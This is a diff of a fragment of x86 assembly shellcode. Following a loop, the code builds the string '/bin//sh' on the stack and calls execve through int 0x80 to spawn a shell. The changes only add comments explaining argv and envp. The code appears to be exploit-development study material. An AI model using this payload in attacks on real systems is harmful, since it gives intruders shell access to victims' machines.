@@ -66,15 +66,15 @@ _start:
 	  jns loop
 
 	mov al, 0x0B	; al = = 0x0b (sys_execve)
-	push esi	; string terminator
+	push esi	; 0 = string terminator
 	push dword 0x68732f2f ; //sh
 	push dword 0x6e69622f ; /bin
 	mov ebx, esp
 
 	push esi
 	push ebx
-	mov ecx, esp
+	mov ecx, esp ;argv = [ *filename, 0 ]
 
-	mov edx, esi
+	mov edx, esi ;envp = NULL
 
 	int 0x80 ; syscall
